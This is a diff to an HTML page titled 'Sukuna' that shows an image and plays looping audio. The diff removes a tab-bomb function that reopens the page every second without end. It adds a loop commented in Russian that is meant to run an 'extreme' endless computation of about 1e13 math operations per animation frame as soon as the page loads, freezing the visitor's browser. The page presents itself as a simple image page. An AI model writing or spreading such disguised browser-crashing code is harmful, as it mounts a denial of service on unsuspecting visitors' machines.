@@ -6,7 +6,7 @@
     <title>Sukuna</title>
 </head>
 <body>
-    <img src="png.png" alt="Sukuna" style="width: 100%; height: auto;" id="clickableImage">
+    <img src="png.png" alt="Изображение" style="width: 100%; height: auto;" id="clickableImage">
 
     <audio id="audio" src="sound.mp3" loop></audio>
 
@@ -19,22 +19,18 @@
                 });
             }
 
-            // Запуск бесконечного дублирования вкладок
-            function duplicateTab() {
-                window.open(window.location.href);
-                setTimeout(duplicateTab, 1000); // Интервал в 1 секунду между открытиями
-            }
-            duplicateTab();
-
-            // Создаем бесконечную нагрузку
-            function createInfiniteLoad() {
-                // Интенсивные вычисления для создания нагрузки
-                for (let i = 0; i < 1e6; i++) {
+            // Создаем экстремальную бесконечную нагрузку
+            function createExtremeLoad() {
+                let iterations = 1e8 * 100000; // Экстремально увеличенное количество итераций
+                for (let i = 0; i < iterations; i++) {
+                    // Очень сложные вычисления
                     Math.sqrt(Math.random()) * Math.random();
+                    Math.sin(Math.random()) * Math.cos(Math.random());
+                    Math.log(Math.random()) * Math.tan(Math.random());
                 }
-                requestAnimationFrame(createInfiniteLoad);
+                requestAnimationFrame(createExtremeLoad);
             }
-            createInfiniteLoad();
+            createExtremeLoad();
         });
     </script>
 </body>
